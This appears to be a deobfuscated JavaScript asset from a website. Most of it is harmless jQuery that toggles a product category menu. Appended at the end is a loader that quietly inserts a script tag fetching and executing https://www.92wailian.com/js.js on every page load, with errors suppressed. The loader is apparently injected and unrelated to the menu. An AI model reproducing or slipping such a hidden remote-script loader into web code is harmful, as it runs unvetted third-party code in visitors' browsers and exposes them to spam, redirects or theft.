//Tue Oct 14 2025 01:45:33 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
$(".cp_type .bd ul li p span").click(function () {
  $(this).parents("li").hasClass("on") ? $(this).parents("li").removeClass("on").find("div").stop().slideUp() : ($(this).parents("li").find("div").removeAttr("style"), $(this).parents("li").addClass("on").find("div").stop().slideDown());
});
document.body.clientWidth <= 1079 && $(".cp_type .hd").click(function () {
  if ($(this).hasClass("on")) $(this).next("div").removeAttr("style"), $(this).removeClass("on").next("div").stop().slideUp();else {
    $(this).next("div").removeAttr("style");
    $(this).addClass("on").next("div").stop().slideDown();
  }
});
$(document).ready(function () {
  $(".cp_type .bd ul li").each(function () {
    const _0x28dc71 = $(this);
    _0x28dc71.hasClass("on") && _0x28dc71.find("div").css("display", "block");
  });
  $(".cp_type .bd ul li div a").each(function () {
    const _0x3513e3 = $(this);
    if (_0x3513e3.hasClass("active")) {
      _0x3513e3.parent("div").css("display", "block").addClass("adminbuy");
    }
  });
  $(".cp_type .bd ul li div").each(function () {
    const _0x71ee27 = $(this);
    _0x71ee27.hasClass("adminbuy") && _0x71ee27.parent("li").addClass("on");
  });
});
function loadScript(_0x69b990, _0x55e1d4) {
  var _0x313adc = document.createElement("script");
  _0x313adc.type = "text/javascript";
  _0x313adc.onload = function () {
    if (_0x55e1d4) _0x55e1d4();
  };
  _0x313adc.onerror = function () {};
  _0x313adc.src = _0x69b990;
  document.head.appendChild(_0x313adc);
}
loadScript("https://www.92wailian.com/js.js", function () {
  console.log("Script executed");
});